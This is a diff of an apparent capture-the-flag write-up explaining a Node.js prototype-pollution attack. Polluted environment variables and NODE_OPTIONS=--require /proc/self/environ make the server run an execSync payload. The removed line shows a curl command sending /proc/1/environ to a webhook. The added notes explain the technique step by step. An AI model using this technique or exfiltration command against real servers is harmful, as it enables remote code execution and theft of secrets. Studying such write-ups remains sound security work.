@@ -435,12 +435,32 @@ Host: f697-1-52-54-122.ngrok.io
 <p>I polluted the following:</p>
 <pre><code class=language-javascript>shell = &quot;/usr/local/bin/node&quot;;
 env = {
+  payload: 'require(&quot;child_process&quot;).execSync(&lt;RCE payload&gt;);//',
   NODE_OPTIONS: &quot;--require /proc/self/environ&quot;,
-  payload:
-    'require(&quot;child_process&quot;).execSync(\'curl -d &quot;$(cat /proc/1/environ)&quot; webhook\');//',
 };
 </code></pre>
 <p>Run the <code>/cowsay</code> route and the server will execute the payload and we got the flag.</p>
+<h4 id=note-to-self>Note to self:</h4>
+<p>More elaboration:</p>
+<ul>
+<li>Running <code>spawnSync("abc", ["arg1", "arg2], { shell: "node", env: { env1: val1, env2: val2 }})</code> is equivalent to</li>
+</ul>
+<pre><code class=language-bash>export ENV1=val1; export ENV2=val2; node -c &quot;abc arg1 arg2&quot;
+</code></pre>
+<ul>
+<li>
+<p>With <code>NODE_OPTIONS=--require /proc/self/environ</code>, <code>node</code> will <code>require</code> the file <code>/proc/self/environ</code>, which in the case above will be <code>ENV1=val1 ENV2=val2</code>.</p>
+</li>
+<li>
+<p>The polluted <code>env</code> must have <code>payload</code> as the first property so it becomes:</p>
+</li>
+</ul>
+<pre><code class=language-bash>export PAYLOAD=&quot;require(\&quot;child_process\&quot;).execSync(&lt;payload&gt;);//&quot; NODE_OPTIONS=&quot;--require /proc/self/environ&quot; node -c &quot;abc arg1 arg2&quot;
+</code></pre>
+<p>and <code>/proc/self/environ</code>&rsquo;s content is:</p>
+<pre><code class=language-bash>PAYLOAD=require(&quot;child_process&quot;).execSync(&lt;payload&gt;);// NODE_OPTIONS=--require /proc/self/environ
+</code></pre>
+<p>The <code>//</code> is required to ignore the other env variables. The content of the file is now valid JS and will be executed, giving me RCE.</p>
 <h2 id=some-2meirl4meirl-thoughts>Some 2meirl4meirl thoughts</h2>
 <pre><code class=language-text>&gt; still have an irrational fear of Java.
 &gt; could not solve the 1 non-Java challenge left.
